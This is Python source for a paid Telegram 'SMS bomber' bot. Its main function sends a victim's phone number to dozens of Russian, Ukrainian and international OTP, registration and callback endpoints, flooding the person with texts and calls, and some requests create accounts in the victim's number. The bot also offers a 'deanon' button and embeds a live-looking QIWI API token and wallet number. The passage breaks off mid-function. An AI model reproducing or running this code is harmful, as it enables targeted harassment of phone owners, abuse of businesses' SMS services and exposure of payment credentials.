# -*- coding: utf-8 -*-
import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import os
import random
import string
import re
from threading import Timer
from threading import Thread
import time
import bomber as bomber_
import cfg
import db

TOKEN = cfg.token

THREADS_LIMIT = 200
THREADS_LIMITS = 200


chat_ids_file = 'chat_ids.txt'
chats_ids_file = 'vip_id.txt'
num_file = 'num.txt'
wl_file = 'numWL.txt'

ADMIN_CHAT_ID = 945934826
ADMIN_CHAT_ID1 = 1120630631
VOXDOX_CHAT_ID = 1256551608

group_id = -1001189674666

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []
running_spams_per_chat_id1 = []
running_spams_per_chat_id2 = []
running_spams_per_chat_ids = []
adm1s = 'admin'
bot.nomer = {}
bot.jeson = {}
bot.status = {}
bot.status1 = {}
bot.name = {}
bot.url = {}
bomber_state = {}

banner = """
<b>🔮 @smsbomber_n1_bot</b>

<b>💞 Разработчик бота: @kakoyta_chel19</b>
"""

################################################
qiwi_token = '72851acc7f04ec59539741464316f1ff'
qiwi_phone = '79826707658'
price = 100
###############Настройка оплаты qiwi############

db.reset_attacks()


def check_vip(user_id):
    f = open(chats_ids_file)
    vips = f.read().split('\n')
    f.close()

    for v in vips:
        if str(user_id) in v:
            spl = v.split('|')
            try:
                return float(spl[1]) > time.time()
            except:
                return False

    return False



def donat():
    wallet = qiwi_phone
    token = qiwi_token
    URL = "https://edge.qiwi.com/payment-history/v2/persons/" + wallet + "/payments"
    PARAMS = {'rows': 1, 'operation': 'IN'}
    HEADERS = {'Accept': 'application/json', 'Authorization': 'Bearer ' + token}
    r = requests.get(url=URL, params=PARAMS, headers=HEADERS)
    response = r.json()

    class payment:
        account = 0,
        amount = 0,
        comment = ''
        date = ''

    payment.account = response['data'][0]['account']
    payment.amount = response['data'][0]['sum']['amount']
    payment.comment = response['data'][0]['comment']
    payment.date = response['data'][0]['date']
    accoun = {}
    amout = {}
    mess = {}
    date = {}

    phone = "+" + str(accoun)
    if (str(phone).strip() == str(payment.account).strip() and str(mess).strip() == str(
            payment.comment).strip() and str(amout).strip() == str(payment.amount).strip() and str(date).strip() == str(
            payment.date).strip()):
        pass
    else:
        if payment.amount >= price:
            if str(payment.comment) in open('vip_id.txt', mode='r', encoding='utf-8').read():
                pass
            else:
                us = open('vip_id.txt', mode='a', encoding='utf-8')
                us.write(str(payment.comment) + '|' + str(int(time.time() + 2592000)) + '\n')
                bot.send_message(payment.comment,
                                 "🙈 Спасибо за покупку\n\n<b>😉 Удачно пользования, и не шалите!</b>",
                                 parse_mode='HTML')
        else:
            pass

    t = Timer(15, donat)
    t.start()


t = Timer(1, donat)
t.start()


def delluser(message):
    with open("vip_id.txt", "r") as f:
        lines = f.readlines()
    with open("vip_id.txt", "w") as f:
        for line in lines:
            if line.strip("\n") != message.text:
                f.write(line)
    bot.send_message(message.chat.id, f"👾 Пользователь {message.text} - успешно удален из базы")
    bot.send_message(message.text, f"👾 У вас забрали доступ к боту, возможно вы что-то нарушили.")


def adduser(message):
    f = open('vip_id.txt', 'a')
    g = open('vip_id.txt')

    try:
        if str(message.text) in g.read():
            edited = re.sub(fr'{message.text}\|\d+', f'{message.text}|{time.time() + 2592000}', open('vip_id.txt').read())
            
            e = open('vip_id.txt', 'w')
            e.write(edited)
            e.close()

        else:
            f.write(str(message.text) + '|' + str(int(time.time())  + 2592000) + '\n')
            bot.send_message(message.chat.id, f"👾 Пользователь {message.text} - успешно добавлен в базу")


        bot.send_message(int(message.text),
                            f'🙈 Спасибо за покупку\n\n<b>😉 Удачно пользования, и не шалите!</b>',
                            parse_mode='HTML')


    except:
        bot.send_message(message.chat.id, "🤒 Ошибка!")

    f.close()
    g.close()


def add_vip(user_id):
    f = open('vip_id.txt', 'a+')
    g = open('vip_id.txt')

    if str(user_id) in g.read():
        edited = re.sub(fr'{user_id}\|\d+', f'{user_id}|{int(time.time()) + 2592000}', open('vip_id.txt').read())
        
        e = open('vip_id.txt', 'w')
        e.write(edited)
        e.close()

    else:
        f.write(str(user_id) + '|' + str(int(time.time())  + 2592000) + '\n')

    f.close()
    g.close()


def prolong_vip(user_id):
    vip = open('vip_id.txt').read()

    valid_thru = int(re.search(fr"(?<={user_id}\|)\d+", vip)[0])
    edited = re.sub(fr'(?<={user_id}\|)\d+', f'{valid_thru + 2592000}', vip)

    open('vip_id.txt', 'w').write(edited)


def addwl(message):
    f = open('numWL.txt')

    try:
        if str(message.text) in f.read():
            bot.send_message(message.chat.id, f"😌 Номер {message.text} - уже есть в белом листе")
        else:
            g = open('numWL.txt', 'a')
            g.write(str(message.text) + '\n')
            g.close()

            bot.send_message(message.chat.id, f"😌 Номер {message.text} - успешно добавлен в белый лист")
            print('+1 number safe')
    except:
        bot.send_message(message.chat.id, "😞 Ошибка! Вы не верный номер!")

    f.close()


def delllwl(message):
    with open("numWL.txt", "r") as f:
        lines = f.readlines()
        f.close()
    with open("numWL.txt", "w") as f:
        for line in lines:
            if line.strip("\n") != message.text:
                f.write(line)
        f.close()

    bot.send_message(message.chat.id, f"😉 Номер {message.text} - успешно удален из базы")


def save_chat_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    with open(chat_ids_file, "a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
        ids_file.close()

    return


def send_message_users(message):
    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'html'
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]
        ids_file.close()

    [send_message(chat_id) for chat_id in ids_list]
    bot.send_message(ADMIN_CHAT_ID, f"😍 Cообщение успешно отправлено ({users_amount[0]}) пользователям бота!")

def send_message_users1(message):
    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'html'
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chats_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]
        ids_file.close()

    [send_message(chat_id) for chat_id in ids_list]
    bot.send_message(ADMIN_CHAT_ID, f"😍 Cообщение успешно отправлено ({users_amount[0]}) пользователям бота с доступом к приватке!")



def posts(message):
    f = open("friend.txt", mode="w", encoding="utf-8")
    f.write(message.text)
    f.close()
    bot.send_message(message.chat.id, "😍 Описание партнера успешно обновлено")


def postss(message):
    f = open("voxgift.txt", mode="w", encoding="utf-8")
    f.write(message.text)
    f.close()
    bot.send_message(message.chat.id, "Текст кнопки Подарок Воксу успешно изменён")


def subchan(message):
    f = open('url.txt', mode='w', encoding='utf-8')
    f.write(message.text)
    f.close()
    bot.send_message(message.chat.id, '😍 Ссылка обновлена')


def postsRES():
    f = open("friend.txt", mode="w", encoding="utf-8")
    f.write("""
       🤪 Реклама - рассылка:
             🤪 Цена: 150₽
             🤪 Каждый пользователь получит уведомление с вашим текстом.

             🤪 Реклама - 🤝 Наш партнёр
             🙃 24 часа (1 день) + 1 рассылка - 250₽
             😍 48 часов (2 дня) + 2 рассылка - 350₽
             🥰 120 часов (5 дней) + 3 рассылка - 450₽
             🤩 Ваш текст будет во вкладке "🌚 Наш партнер"

             🤩 Купить: @kakoyta_chel19
             ✴️ Отзывы о покупке рекламы: @OtziviDarkBomber""")
    f.close()

@bot.message_handler(commands=['start'])
def start(message):
    if len(message.text) > 6:
        referer_id = int(message.text[7:])

        if referer_id != message.chat.id:
            db.set_referal(message.chat.id, referer_id)

        count = db.referals_count(referer_id)

        if count and count % 30 == 0:
            if check_vip(referer_id):
                prolong_vip(referer_id)
            else:
                add_vip(referer_id)

            bot.send_message(referer_id, 'Вы набрали 30 рефералов, вам выдан приват на месяц!')

    keyboard = types.ReplyKeyboardMarkup(row_width=3, resize_keyboard=True)
    boom = types.KeyboardButton(text='💣 SPAM')
    stop = types.KeyboardButton(text='✖️ Стоп')
    deanon = types.KeyboardButton(text='〰️ Деанон')
    info = types.KeyboardButton(text='▪️Информация▪️')
    stats = types.KeyboardButton(text='◾Статистика◾')
    private = types.KeyboardButton(text='ПРИВАТ ⚫')
    spons = types.KeyboardButton(text='НАШ ПАРТНЁР®️')
    voxgiftbutton = types.KeyboardButton(text='Подарок Воксу')

    buttons_to_add = [boom, stop, deanon, info, stats, private, spons, voxgiftbutton]

    keyboard.add(*buttons_to_add)

    some_var = bot.get_chat_member(group_id, message.chat.id)
    user_status = some_var.status

    url = open('url.txt', 'r')
    urls = open('urls.txt', 'r')

    global inl_keyboard
    inl_keyboard = types.InlineKeyboardMarkup()
    s = types.InlineKeyboardButton(text='Подписаться', url=url.read())
    inl_keyboard.add(s)
    if user_status == 'member' or user_status == 'administrator' or user_status == 'creator':
	    bot.send_message(message.chat.id, 'Привет, бомбер готов к атаке 🧨', reply_markup=keyboard)
	    save_chat_id(message.chat.id)

    if user_status == 'restricted' or user_status == 'left' or user_status == 'kicked':
        bot.send_message(message.chat.id,
                         'Вы не подписаны на наш канал!\n\nПодпишитесь на него чтобы получить доступ к боту.\n\nИ снова нажмите 👉🏻 /start 👈🏻',
                         reply_markup=inl_keyboard)


def send_for_number(phone): 
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    iteration = 0
    _email = _name + f'{iteration}' + '@gmail.com'
    email = _name + f'{iteration}' + '@gmail.com'
    _phone = '380930658455'
    _phoneNEW = phone[3:]
    _phone = phone
    _phone9 = _phone[1:]
    _phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                         9:11]  # +7+(915)350-99-08
    _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]  # 915+350-99-08
    _phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                       9:11]  # '+7+(915)350-99-08'
    _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[
                                                                                                           9:11]  # '+7 (915) 350 99 08'
    _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]  # '915) 350-99-08'
    _phonePozichka = '+' + _phone[0:2] + '-' + _phone[2:5] + '-' + _phone[5:8] + '-' + _phone[8:10] + '-' + _phone[
                                                                                                            10:12]  # 38-050-669-16-10'
    _phoneQ = '+' + _phone[0:2] + '(' + _phone[2:5] + ') ' + _phone[5:8] + ' ' + _phone[8:10] + ' ' + _phone[
                                                                                                      10:12]  # +38(050) 669 16 10
    _phoneCitrus = '+' + _phone[0:3] + ' ' + _phone[3:5] + '-' + _phone[5:8] + ' ' + _phone[8:10] + ' ' + _phone[10:12]
    _phoneComfy = '+' + _phone[0:2] + ' (' + _phone[2:5] + ') ' + _phone[5:8] + '-' + _phone[8:10] + '-' + _phone[10:12]
    _phone88 = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + '-' + _phone[9:11]
    _phone585 = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                      9:11]  # +7 (925) 350-99-01
    request_timeout = 0.01
    
    try:
        requests.post("https://secunda.com.ua/personalarea/registrationvalidphone",
                      data={"ph": "+" + _phone})
        print("[+] Secunda отправлена!")
    except:
        print("[-] 1 не отправлено!")

    try:
        requests.post("https://rieltor.ua/api/users/register-sms/",
                      json={"phone": _phone, "retry": 10})
        print("[+] Rieltor отправлено!")
    except:
        print("[-] 4 не отправлено!")

    try:
        requests.post("https://loany.com.ua/funct/ajax/registration/code",
                      data={"phone": _phone})
        print("[+] loany отправлено!")
    except:
        print("[-] 5 не отправлено!")

    try:
        requests.post("https://www.sportmaster.ru/user/session/sendSmsCode.do",
                      params={"phone": _phone585})
        print("[+] SportMasterRU отправлено!")
    except:
        print("[-] 6 не отправлено!")

    try:
        requests.post("https://iqlab.com.ua/session/ajaxregister",
                      data={"cellphone": _phoneQ})
        print("[+] Iqlab отправлено!")
    except:
        print("[-] 7 не отправлено!")

    try:
        requests.post("https://izi.ua/api/auth/register",
                      json={
                          "phone": "+" + _phone,
                          "name": "Артём",
                          "is_terms_accepted": True,
                      },
                      )
        print("[+] IZI отправлено!")
    except:
        print("[-] 8 не отправлено!")

    try:
        requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",
                      json={
                          "doc": {
                              "auth": {
                                  "mphone": "+" + _phone,
                                  "bdate": "11.11.1999",
                                  "deviceid": "00100",
                                  "version": "1.0",
                                  "source": "site",
                                  "signature": "undefined",
                              }
                          }
                      },
                      headers={"Accept": "application/json"},
                      )
        print("[+] Ubki отправлено!")
    except:
        print("[-] 9 не отправлено!")

    try:
        requests.post("https://api.pozichka.ua/v1/registration/send",
                      json={
                          "RegisterSendForm": {
                              "phone": _phonePozichka
                          }
                      },
                      )
        print("[+] Pozichka отправлено!")
    except:
        print("[-] 10 не отправлено!")

    try:
        requests.post("https://www.aptekaonline.ru/login/ajax_sms_order.php",
                      data={"PERSONAL_MOBILE": "+" + _phone})
        print("[+] AptekaOnline отправлено!")
    except:
        print("[-]  12 не отправлено!")

    try:
        requests.post("https://api.cian.ru/sms/v1/send-validation-code/",
                      json={"phone": "+" + _phone, "type": "authenticateCode"})
        print("[-] Cian отправлено!")
    except:
        print("[-] 13 не отправлено!")

    try:
        requests.post("https://clients.cleversite.ru/callback/run.php",
                      data={
                          "siteid": "62731",
                          "num": _phone,
                          "title": "Онлайн-консультант",
                          "referrer": "https://m.cleversite.ru/call",
                      },
                      )
        print("[+] звонок отправлен!")
    except:
        print("[-] 14 не отправлено!")

    try:
        requests.post("https://hr.zarplata.ru/api/v2/users",
                      json={
                          "phone": {"value": _phone},
                          "password": password,
                          "type": "employer",
                      },
                      )
        print("[+] Zarplata отправлено!")
    except:
        print("[-] 15 не отправлено!")

    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify",
                      json={"phone_number": _phone, "region_code": "RU"})
        print("[+] ImgurRU отправлено!")
    except:
        print("[-] 16 не отправлено!")

    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify",
                      json={"phone_number": _phone, "region_code": "UA"})
        print("[+] ImgurUA отправлено!")
    except:
        print("[-] 17 не отправлено!")

    try:
        requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code",
                      data="+" + _phone, )
        print("[+] MoneyMan отправлено!")
    except:
        print("[-] 18 не отправлено!")

    try:
        requests.post("https://napopravku.ru/api/v2/user/send/sms/",
                      data={"phone": "+" + _phone, "onlyAuth": 0})
        print("[+] Napopravku отправлено!")
    except:
        print("[-] 19 не отправлено!")

    try:
        requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": _phone})
        print("[+] NNcard отправлен!")
    except:
        print("[-] 20 не отправлено!")

    try:
        requests.post("https://www.prosushi.ru/php/profile.php",
                      data={"phone": "+" + _phone, "mode": "sms"})
        print("[+] ProSushi отправлено!")
    except:
        print("[-]  21 не отправлено!")

    try:
        requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",
                      data={"phone": "+" + _phone})
        print("[+] RichFamily отправлено!")
    except:
        print("[-] 22 не отправлено!")

    try:
        requests.post("https://www.tvoyaapteka.ru/bitrix/ajax/form_user_new.php?confirm_register=1",
                      data={"tel": "+" + _phone, "change_code": 1})
        print("[+] TvoyaApteka отправлено!")
    except:
        print("[-] 23 не отправлено!")

    try:
        requests.post("https://izi.ua/api/auth/register",
                      json={
                          "phone": "+" + _phone,
                          "name": "Максим",
                          "is_terms_accepted": True,
                      },
                      )
        print("[+] Izi(1) отправлен")
    except:
        print("[-] 25 не отправлено!")

    try:
        requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone})
        print("[+] IZI(2) отправлено!")
    except:
        print("[-] 26 не отправлено!")

    try:
        requests.post("https://my.citrus.ua/api/v2/register",
                      data={"email": email, "name": "Артем", "12phone": _phone, "password": password,
                            "confirm_password": password})
        print("[+] Регестрация на Citrus отправлена!")
    except:
        print('[-] 27 не отправлено!')

    try:
        requests.post("https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus})
        print("[+] Citrus отправлено!")
    except:
        print("[-] 28 не отправлено!")

    try:
        requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",
                      json={"FirstName": "Артем", "CellPhone": _phone, "Package": "optimal"})
        print('[+] отправлено!')
    except:
        print('[-] 29 не отправлено!')

    try:
        requests.post("https://www.moyo.ua/identity/registration",
                      data={
                          "firstname": "Артем",
                          "phone": _phone,
                          "email": email
                      }
                      )
        print('[+] Moyo отправлено!')
    except:
        print('[-] 30 не отправлено!')

    try:
        requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
        print('[+] FoxTrot отправлено!')
    except:
        print('[-] 32 не отправлено!')

    try:
        requests.post('https://cinema5.ru/api/phone_code', data={"phone": _phonePizzahut})
        print('[+] Cinema5 отправлено!')
    except:
        print('[-] 33 не отправлено!')

    try:
        requests.post("https://www.etm.ru/cat/runprog.html",
                      data={
                          "m_phone": _phone,
                          "mode": "sendSms",
                          "syf_prog": "clients-services",
                          "getSysParam": "yes",
                      },
                      )
        print('[+] ETM отправлено!')
    except:
        print('[-] 34 не отправлено!')

    try:
        requests.post("https://apteka.ru/_action/auth/getForm/",
                      data={
                          "form[NAME]": "",
                          "form[PERSONAL_GENDER]": "",
                          "form[PERSONAL_BIRTHDAY]": "",
                          "form[EMAIL]": "",
                          "form[LOGIN]": _phone585,
                          "form[PASSWORD]": password,
                          "get-new-password": "Получите пароль по SMS",
                          "user_agreement": "on",
                          "personal_data_agreement": "on",
                          "formType": "simple",
                          "utc_offset": "120",
                      },
                      )
        print('[+] Apteka отправлено!')
    except:
        print('[-] 35 не отправлено!')

    try:
        requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone})
        print('[+] отправлено!')
    except:
        print('[-] 36 не отправлено!')

    try:
        requests.post("https://secunda.com.ua/personalarea/registrationvalidphone", data={"ph": "+" + _phone})
        print('[+] Secunda отправлено!')
    except:
        print('[-] 37 не отправлено!')

    try:
        requests.post("http://api.rozamira-azs.ru/v1/auth", data={"login": _phone, })
        print('[+] rozamira-azs отправлено!')
    except:
        print('[-] 38 не отправлено!')

    try:
        requests.post("https://api.iconjob.co/api/auth/verification_code",
                      json={"phone": _phone})
        print('[+] отправлено')
    except:
        print('[-] 41 не отправлено!')

    try:
        requests.post("https://panda99.ru/bdhandlers/order.php?t={int(time())}",
                      data={
                          "CB_NAME": "Артем",
                          "CB_PHONE": _phone88})
        print('[+] отправлено!')
    except:
        print('[-] 42 не отправлено!')

    try:
        requests.post("https://auth.pizza33.ua/ua/join/check/",
                      params={
                          "callback": "angular.callbacks._1",
                          "email": _email,
                          "password": password,
                          "phone": _phone,
                          "utm_current_visit_started": 0,
                          "utm_first_visit": 0,
                          "utm_previous_visit": 0,
                          "utm_times_visited": 0,
                      },
                      )
        print('[+] отправлено!')
    except:
        print('[-] 43 не отправлено!')

    try:
        requests.post("https://zoloto585.ru/api/bcard/reg/",
                      json={
                          "name": "Максим",
                          "surname": "Летовал",
                          "patronymic": "Максимович",
                          "sex": "m",
                          "birthdate": "11.11.1999",
                          "phone": _phone585,
                          "email": email,
                          "city": "Москва",
                      },
                      )
        print('[+] Zoloto585 отправлено!')
    except:
        print('[-] 45 не отправлено!')

    try:
        requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
                      data={"phone": _phone585},
                      )
        print('[+] Pliskov отправлено!')
    except:
        print('[-] 46 не отправлено!')

    try:
        requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
        print('[+] FoxTrot отправлено!')
    except:
        print('[-] 47 не отправлено!')

    try:
        requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
                      data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
        print("[+] Taxi-Ritm отправлено!")
    except:
        print("[-] 48 не отправлено!")

    try:
        requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
                      data={"demo_number": "+" + _phone, "ajax_demo_send": "1"},
                      )
        print('[+] Sms4 отправлено!')
    except:
        print('[-] 49 не отправлено!')

    try:
        requests.post("https://www.flipkart.com/api/5/user/otp/generate",
                      headers={
                          "Origin": "https://www.flipkart.com",
                          "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                      },
                      data={"loginId": "+" + _phone})
        print('[+] FlipKart отправлено!')
    except:
        print('[-] 50 не отправлено!')

    try:
        requests.post("https://www.flipkart.com/api/6/user/signup/status",
                      headers={
                          "Origin": "https://www.flipkart.com",
                          "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                      },
                      json={"loginId": "+" + _phone, "supportAllStates": True})
        print('[+] FlipKart отправлено!')
    except:
        print('[-] 51 не отправлено!')

    try:
        requests.post("https://bamper.by/registration/?step=1",
                      data={
                          "phone": "+" + _phone,
                          "submit": "Запросить смс подтверждения",
                          "rules": "on",
                      },
                      )
        print('[+] Bamper отправлено!')
    except:
        print('[-] 52 не отправлено!')

    try:
        requests.post("https://friendsclub.ru/assets/components/pl/connector.php",
                      data={"casePar": "authSendsms", "MobilePhone": "+" + _phone})
        print('[+] FriendClub отправлено!')
    except:
        print('[-] 53 не отправлено!')

    try:
        requests.post("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29",
                      data={"caller_number": _phone})
        print('[+] SalamPay отправлено!')
    except:
        print('[-] 54 не отправлено!')

    try:
        requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
                      json={
                          "phone": "+" + _phone,
                          "first_name": "-",
                          "utm_data": {},
                          "via": "call",
                      })
        print('[+] звонок отправлен!')
    except:
        print('[-] 55 не отправлен!')

    try:
        requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
                      json={
                          "phone": "+" + _phone,
                          "first_name": "-",
                          "utm_data": {},
                          "via": "sms",
                      },
                      )
        print('[+] Uchi отправлено!')
    except:
        print('[-] 56 не отправлено!')

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                      data={"msisdn": _phone, "locale": "en", "countryCode": "ru", "version": "1",
                            "k": "ic1rtwz1s1Hj1O0r", "r": "46763", })
        print('[+] ICQ отправлено!')
    except:
        print('[-] 57 не отправлено!')

    try:
        requests.post('https://shafa.ua/api/v3/graphiql', json={
            "operationName": "RegistrationSendSms",
            "variables": {"phoneNumber": "+" + _phone},
            "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
        },
                      )
        print('[+] Shafa отправлено!')
    except:
        print('[-] 58 не отправлено!')

    try:
        requests.post('https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      headers={"Referer": "https://alpari.com/en/registration/"},
                      json={
                          "client_type": "personal",
                          "email": _email,
                          "mobile_phone": _phone,
                          "deliveryOption": "sms",
                      },
                      )
        print('[+] Alpari отправлено!')
    except:
        print('[-] 59 не отправлено!')

    try:
        requests.post('https://uklon.com.ua/api/v1/account/code/send',
                      headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
                      json={"phone": _phone},
                      )
        print('[+] Uklon отправлено!')
    except:
        print('[-] 60 не отправлено!')

    try:
        requests.post('https://crm.getmancar.com.ua/api/veryfyaccount',
                      json={"phone": "+" + _phone, "grant_type": "password", "client_id": "gcarAppMob",
                            "client_secret": "SomeRandomCharsAndNumbersMobile"})
        print('[+] GetMancar отправлено!')
    except:
        print('[-] 61 не отправлено!')

    try:
        requests.post('https://auth.multiplex.ua/login', json={'login': _phone})
        print('[+] MultiPlex отправлено!')
    except:
        print('[-] 62 не отправлено!')

    try:
        requests.post('https://secure.ubki.ua/b2_api_xml/ubki/auth', json={"doc": {
            "auth": {"mphone": "+" + _phone, "bdate": "11.11.1999", "deviceid": "00100", "version": "1.0",
                     "source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json"})
        print('[+] Ubki отправлено!')
    except:
        print('[-] 64 не отправлено!')

    try:
        requests.post('https://www.top-shop.ru/login/loginByPhone/', data={"phone": _phonePizzahut})
        print('[+] Top-Shop отправлено!')
    except:
        print('[-] 65 не отправлено!')

    try:
        requests.post("https://izi.ua/api/auth/register",
                      json={
                          "phone": "+" + _phone,
                          "name": "Анастасия",
                          "is_terms_accepted": True,
                      },
                      )
        print('[+] Izi отправлено!')
    except:
        print('[-] 69 не отправлено!')

    try:
        requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone})
        print('[+] Izzi отправлено!')
    except:
        print('[-] 70 не отправлено!')

    try:
        requests.post('https://api.pozichka.ua/v1/registration/send',
                      json={"RegisterSendForm": {"phone": _phonePozichka}})
        print('[+] Pozichka отправлено!')
    except:
        print('[-] 71 не отправлено!')

    try:
        requests.post('https://ontaxi.com.ua/api/v2/web/client', data={"country": "UA", "phone": phone[3:]})
        print('[+] OnTaxi отправлено!')
    except:
        print('[-] 72 не отправлено!')

    try:
        requests.post('https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php',
                      data={"data": _phone, "metod": "postreg"})
        print('[+] Makarolls отправлено!')
    except:
        print('[-] 74 не отправлено!')

    try:
        requests.post('https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode',
                      data={"telephone": "8" + _phone[1:]})
        print('[+] PanPizza отправлено!')
    except:
        print('[-] 75 не отправлено!')

    try:
        requests.post("https://www.moyo.ua/identity/registration",
                      data={"firstname": "Артем", "phone": _phone, "email": email})
        print('[+] MOYO отправлено!')
    except:
        print('[-] 76 не отправлено!')

    try:
        requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone})
        print('[+] StarPizzaCafe отправлено!')
    except:
        print('[-] 78 не отправлено!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                      data={'phone_number': _phone}, headers={})
        print('[+] Tinder sent!')
    except:
        print('[-] 79 не отправлено!')

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
        print('[+] Karusel sent!')
    except:
        print('[-] 80 не отправлено!')

    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
        print('[+] Tinkoff отправлено!')
    except:
        print('[-] 81 не отправлено!')

    try:
        requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
        print('[+] MonoBank отправлено!')
    except:
        print('[-] 83 не отправлено!')

    try:
        requests.post(f'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}',
                      data={"result": "ok"})
        print('[+] SportMaster отправлено!')
    except:
        print('[-] 84 не отправлено!')

    try:
        requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
        print('[+] Alfalife отправлено!')
    except:
        print('[-] 85 не отправлено!')

    try:
        requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
        print('[+] KoronaPay отправлено!')
    except:
        print('[-] 86 не отправлено!')

    try:
        requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone, })
        print('[+] BTfair отправлено!')
    except:
        print('[-] 87 не отправлено!')

    try:
        requests.post('https://ggbet.ru/api/auth/register-with-phone',
                      data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on",
                            "oferta": "on", })
        print('[+] GGbet отправлено!')
    except:
        print('[-]  88 не отправлено!')

    try:
        requests.post('https://www.etm.ru/cat/runprog.html',
                      data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services",
                            "getSysParam": "yes", })
        print('[+] ETM отправлено!')
    except:
        print('[-] 89 не отправлено!')

    try:
        requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })
        print('[+] TheLive отправлено!')
    except:
        print('[-] 90 не отправлено!')

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
        print('[+] MTS sent!')
    except:
        print('[-] 91 не отправлено!')

    try:
        requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
        print('[+] MyGames sent!')
    except:
        print('[+] 92 не отправлено!')

    try:
        requests.post('https://zoloto585.ru/api/bcard/reg/',
                      json={"name": _name, "surname": _name, "patronymic": _name, "sex": "m", "birthdate": "11.11.1999",
                            "phone": (_phone, "+* (***) ***-**-**"), "email": _email, "city": "Москва", })
        print('[+] Zoloto585 отправлено!')
    except:
